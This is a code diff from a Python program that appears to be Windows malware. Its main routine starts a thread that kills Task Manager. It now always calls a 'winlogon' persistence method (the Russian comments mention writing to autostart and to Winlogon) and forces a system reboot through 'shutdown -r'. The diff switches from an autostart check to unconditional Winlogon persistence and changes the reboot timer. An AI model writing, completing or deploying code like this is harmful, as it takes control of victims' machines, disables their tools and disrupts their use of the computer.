@@ -43,7 +43,7 @@ class Dispatcher:
         
     def reboot(self, time: bool) -> None:
         if time is True:
-            os.system('shutdown -r -t 25')
+            os.system('shutdown -r -t 30')
             
         else:
             os.system('shutdown -r -t 00')
@@ -82,19 +82,23 @@ def main() -> None:
     computer = Dispatcher(name)
     threading.Thread(target=kill_task_manager).start()
     
-    if computer.check_startup_entry() is True:
-        computer.reboot(time=True)
+    # Запись в автозагрузку
+    # if computer.check_startup_entry() is True:
+    #     computer.reboot(time=True)
         
-    else:
-        computer.winlogon()
-        # computer.add_to_startup()
+    # else:
+    #     # computer.add_to_startup()
+    
+    # Запись в winlogon
+    computer.winlogon()
+    computer.reboot(time=True)
+        
         
     
 
 
 if __name__ == '__main__':
     main()
-    
         
     
     
